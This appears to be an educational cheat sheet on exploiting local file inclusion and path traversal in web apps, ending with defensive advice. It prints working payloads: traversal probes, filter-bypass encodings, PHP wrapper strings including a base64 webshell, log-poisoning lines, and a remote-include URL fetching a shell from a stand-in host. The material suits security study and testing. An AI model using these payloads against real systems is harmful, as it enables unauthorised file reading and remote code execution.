# LFI & path traversal

Two related bugs that come from the same mistake: putting user input into a file
path. **Path traversal** lets you *read* files outside the intended directory.
**Local File Inclusion (LFI)** is when that path feeds an `include()`-style call,
so the file is *executed* — which is a short road to code execution.

All examples are generic. Nothing here is the solution to a specific challenge.

## 1. Spotting it

Look at anything that names a file or a page: `?page=`, `?file=`, `?lang=`,
`?template=`, `?download=`. The tell is that the value looks like it ends up on
disk.

The first probe on Linux is always the same:

```
?page=../../../../../../etc/passwd
```

On Windows:

```
?page=..\..\..\..\windows\win.ini
```

If you get the file back, it's traversal. If the app seems to *run* what it loads
(PHP pages render instead of showing source), you're looking at LFI.

## 2. Path traversal basics

`../` climbs one directory. Stack enough of them to reach the filesystem root,
then walk down to the target. A few more moves:

- **absolute path** — sometimes the prefix isn't forced, so `?page=/etc/passwd`
  is enough.
- **a forced extension** — if the code appends `.php`, you need to deal with it
  (see null byte / wrappers below).
- **a forced prefix** — if it prepends a folder, just traverse out of it.

## 3. Getting past filters

Naive filters strip or block `../`. Common bypasses:

- **Non-recursive strip** — if the filter removes `../` once, `....//` collapses
  back to `../` after the removal. Same idea: `..././`.
- **URL encoding** — `%2e%2e%2f` for `../`; **double encoding** `%252e%252e%252f`
  when one layer decodes before the check.
- **Overlong / Unicode** — `%c0%ae` style sequences on some stacks.
- **Null byte** — on old PHP (< 5.3.4), `?page=/etc/passwd%00` cuts off a forced
  `.php` suffix.

## 4. PHP wrappers (where LFI gets dangerous)

With PHP, the "file" can be a wrapper, which turns a read into much more.

**Read source code** with `php://filter` — base64 so PHP tags don't execute:

```
?page=php://filter/convert.base64-encode/resource=index.php
```

Decode the output and you have the source (great for finding the next bug, DB
creds, etc.).

**Execute code** when wrappers are allowed:

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==   (<?php system($_GET[0]); ?>)
?page=php://input        + POST body: <?php system('id'); ?>
?page=expect://id
```

## 5. From LFI to RCE without wrappers

When `data://`/`input` are off, you make the server write attacker-controlled
text into a file you can then include:

- **Log poisoning** — put PHP in a field that gets logged (e.g. `User-Agent`),
  then include the log:
  ```
  User-Agent: <?php system($_GET[0]); ?>
  ?page=../../../../var/log/apache2/access.log&0=id
  ```
- **Session files** — if a value you control lands in `/var/sess_<id>`, include
  that.
- **/proc/self/environ** — on older setups, poison via `User-Agent` and include
  it.

And if `allow_url_include` is on, LFI becomes **RFI**: include a remote file
directly (`?page=http://you/shell.txt`).

## 6. Defending

- Don't put user input in file paths. If you must, **whitelist** allowed values
  and map them server-side.
- `basename()` the input and pin it to a fixed directory; reject anything with
  `..`, null bytes or schemes.
- Turn off `allow_url_include` (and `allow_url_fopen` if you can), set a tight
  `open_basedir`.
- Keep logs and session dirs out of the web-reachable include scope.

---

Built by **White** · [github.com/white-exee](https://github.com/white-exee)
